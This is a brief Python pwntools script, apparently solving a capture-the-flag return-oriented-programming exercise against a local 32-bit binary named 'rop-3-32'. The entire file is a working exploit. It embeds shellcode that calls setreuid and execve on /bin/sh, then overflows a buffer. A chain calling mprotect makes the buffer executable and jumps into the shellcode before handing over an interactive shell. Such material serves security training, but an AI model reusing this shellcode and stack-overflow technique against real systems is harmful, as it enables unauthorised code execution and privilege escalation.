#!/usr/bin/env python

from pwn import *


SHELLCODE = 'j2X\xcd\x80P[PYjGX\xcd\x80j\x0bX\x99Rhn/shh//biRYT[\xcd\x80'

p = process("./rop-3-32")

addr_mprotect = p.elf.symbols['mprotect']

# 0x080485a7 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
ppppr = 0x80485a7
pppr = 0x80485a8
ppr = 0x80485a9
pr = 0x80485aa

g_buf = 0x804a060

aligned_g_buf = g_buf & 0xfffff000


payload = SHELLCODE + "A" * (0x98 + 4 - len(SHELLCODE))

# call mprotect(aligned_g_buf, 0x1000, 7)
# then call g_buf

payload += p32(addr_mprotect) + p32(g_buf) + p32(aligned_g_buf) + \
        p32(0x1000) + p32(7)

p.sendline(payload)

p.interactive()
